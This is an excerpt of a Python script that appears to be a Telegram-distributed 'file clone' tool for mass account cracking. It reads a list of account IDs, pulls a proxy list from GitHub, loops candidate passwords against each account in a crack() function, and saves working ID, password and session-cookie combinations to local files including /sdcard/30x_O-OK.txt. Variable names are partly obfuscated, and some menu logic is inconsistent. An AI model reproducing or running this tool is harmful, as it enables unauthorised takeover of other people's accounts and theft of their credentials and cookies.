...
def uaku():
	try:
		...
		a=requests.get('https://raw.githubusercontent.com/30x_Ohackerx/FINDIP/main/http_proxies.txt').text
		ua=open('.bbnew.txt','w')
...
　　 　　>　 　 　,)
　　　　　∠_,,,/
\033[1;92mTelegram : @Cyx_O
\033[1;92mChannel   :  https://t.me/B4R_B0SA
\033[1;92mVersion  : 8.1
...
def menu():
	banner()
	_IPYTHONI_(f'[ 01 ] FILE CLONE')
	_IPYTHONI_(f'[ 00 ] Exit')
	_____IPYTHONI_____ = input(WHITE+'Select :\x1b[1;97m ')
	if _____IPYTHONI_____ in ['1','01']:
		F()
	elif _____IPYTHONI_____ in ['0','00']:
		sys.exit()
	else:
		print(WHITE+'NOT SELECT ')
		back()
def error():
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input (WHITE+' ENTER FILE NAME : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(WHITE+'TOTAL IDS : '+str(len(id)))
			for i in range(101):
...
def Settings():
	banner()
	print(WHITE+' [ 1 ] Fast')
	hu = input(WHITE+' Select => ')
	if hu in ['00001','000001']:
		muda=[]
		...
		print(WHITE+'Error SELECT')
		exit()
	write("-"*30)
	print(f' [ 01 ] Method Fast')
	hc = input(WHITE+' Select => ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	write("-"*30)
	pwplus=input(WHITE+' [ 01 ] Normal\n [ 02 ] Fast\n SELECT => ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	banner()
	write(" "+"-"*50)
	write(" [+] DATE : "+str(ha)+"-"+str(bu)+"-"+str(ta))
	write(" "+"-"*50)
	write(" [+] TOTTAL IDS = \u001b[32;1m"+str(len(id)))
	os.system("clear")
	write(" "+"-"*50)
	...
	print(f' CLONING HAS COMPLITED ')
	print(f' OK : {h}%s '%(ok))
	print(WHITE+'back to menu (y) exit (T)')
	woi = input(' choose  : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r\u001b[0m[30x_O] [{loop}|{len(id)}] [\u001b[32;1m{str(ok)}\u001b[0m=\u001b[33;1m{str(cp)}\u001b \u001b[0m ]"),sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\u001b[32;1m\n[OK-30x_O] {idf} | {pw} | {kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				open("/sdcard/30x_O-OK.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
